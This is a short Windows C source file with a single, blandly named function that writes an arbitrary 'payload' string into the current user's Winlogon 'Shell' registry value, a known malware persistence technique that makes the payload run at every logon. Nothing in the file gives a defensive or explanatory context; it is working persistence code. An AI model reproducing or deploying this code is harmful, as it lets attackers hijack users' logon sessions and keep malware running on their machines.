#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v1(const char* payload){
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Shell", 0, REG_SZ, (const BYTE*)payload, lstrlenA(payload));
        RegCloseKey(hKey);
    }
}